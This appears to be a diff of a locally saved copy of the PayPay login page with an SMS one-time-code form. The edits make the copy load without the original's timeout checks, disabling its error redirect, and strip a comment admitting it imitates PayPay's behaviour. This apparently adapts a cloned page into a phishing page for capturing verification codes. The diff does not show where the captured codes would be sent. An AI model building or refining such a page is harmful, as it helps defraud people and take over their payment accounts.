@@ -45,7 +45,7 @@
     <script>
       (function () {
         var apiPath10s = '/api/v1/custom-metrics/appLoadTimeout10S'
-        window.hasLoaded = false
+        window.hasLoaded = true // ★変更: タイムアウト回避のため最初からtrueに
 
         function appMountHandler() {
           window.hasLoaded = true
@@ -69,13 +69,12 @@
           }
         }, 10000)
 
-
-        // redirect to /error/general when the page is not loaded after 30s
-        setTimeout(function () {
-          if (!window.hasLoaded) {
-            window.location.href = '/error/general';
-          }
-        }, 30000);
+        // ★変更: 30秒後のエラーページリダイレクトを無効化
+        // setTimeout(function () {
+        //   if (!window.hasLoaded) {
+        //     window.location.href = '/error/general';
+        //   }
+        // }, 30000);
       })()
     </script>
     <script>
@@ -110,24 +109,19 @@
         const iosVersionRegex = /ip[honead]{2,4}\b.*os ([\d_]+) like mac/i
         const androidVersionRegex = /android[-/ ]?([\d.]*)/i
 
-        // if ios
         if (isIOS()) {
           const res = iosVersionRegex.exec(window.navigator.userAgent)
           if (!res || !res[1]) return false
-
           const osVersion = res[1].split('.').map((s) => parseInt(s))
           if (osVersion[0] < MINIMUM_IOS_VERSION) return true
         }
 
-        // if android
         if (isAndroid()) {
           const res = androidVersionRegex.exec(window.navigator.userAgent)
           if (!res || !res[1]) return false
-
           const osVersion = res[1].split('_').map((s) => parseInt(s))
           if (osVersion[0] < MINIMUM_ANDROID_VERSION) return true
         }
-
         return false
       }
 
@@ -146,7 +140,6 @@
       }
 
       setTimeout(function () {
-
         const IGNORE_PATH = ['/app/pre-auth/embed/history', '/app/channel/embed/rate-review']
 
         if (!window.hasLoaded) {
@@ -178,7 +171,6 @@
       #index-loading {
         --primary-color: #ff0022;
         --secondary-color: #00adeb;
-
         position: absolute;
         top: 50vh;
         left: 50vw;
@@ -195,39 +187,21 @@
         height: 18px;
         background-color: #333;
         border-radius: 100%;
-
         animation: sk-bouncedelay 1s infinite ease-in-out both;
       }
 
-      #index-loading > div.bounce1 {
-        animation-delay: 0.15s;
-      }
-
-      #index-loading > div.bounce2 {
-        animation-delay: 0.3s;
-      }
-
-      #index-loading > div.bounce3 {
-        animation-delay: 0.45s;
-      }
-
-      #index-loading > div.bounce4 {
-        animation-delay: 0.6s;
-      }
-
-      #index-loading > div.bounce5 {
-        animation-delay: 0.75s;
-      }
+      #index-loading > div.bounce1 { animation-delay: 0.15s; }
+      #index-loading > div.bounce2 { animation-delay: 0.3s; }
+      #index-loading > div.bounce3 { animation-delay: 0.45s; }
+      #index-loading > div.bounce4 { animation-delay: 0.6s; }
+      #index-loading > div.bounce5 { animation-delay: 0.75s; }
 
       @keyframes sk-bouncedelay {
-        0%,
-        80%,
-        100% {
+        0%, 80%, 100% {
           transform: scale(0.2);
           background-color: #ff0022;
           background-color: var(--primary-color);
         }
-
         40% {
           transform: scale(1);
           background-color: #00adeb;
@@ -261,8 +235,6 @@
         enabled. Please enable it to continue.</strong
       >
     </noscript>
-    
-    
     
     <div id="app" data-v-app=""><div id="app" style="--font-weight-bold: var(--font-weight-bold-ios); --RootPortal-zIndex: 1100;"><!----><div class="container"><section data-v-32bf0b5d="" class="account-root-page"><section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header"><header data-v-b035e588="" class="header-signin"><img data-v-b035e588="" src="./payapay_files/logo.png" alt="PayPay" height="45"><h2 data-v-b035e588="">ログイン</h2></header><div data-v-b035e588="" class="header-more"></div></section><div data-v-32bf0b5d="" class="account-content"><!----><section data-v-7964b47e="" data-v-32bf0b5d="" class="otp-auth-page"><div data-v-7964b47e="" class="mb10"><i data-v-3c7781bb="" data-v-7964b47e="" class="component-icon
     icon-phone-sms
@@ -336,7 +308,7 @@
         const smsInput = document.getElementById('sms-input');
         const submitBtn = document.getElementById('sms-submit');
 
-        // 入力値を監視して、4桁入力されたらボタンを有効化する（PayPayの挙動を再現）
+        // 入力値を監視して、4桁入力されたらボタンを有効化する
         smsInput.addEventListener('input', function() {
           if (this.value.length === 4) {
             submitBtn.disabled = false;
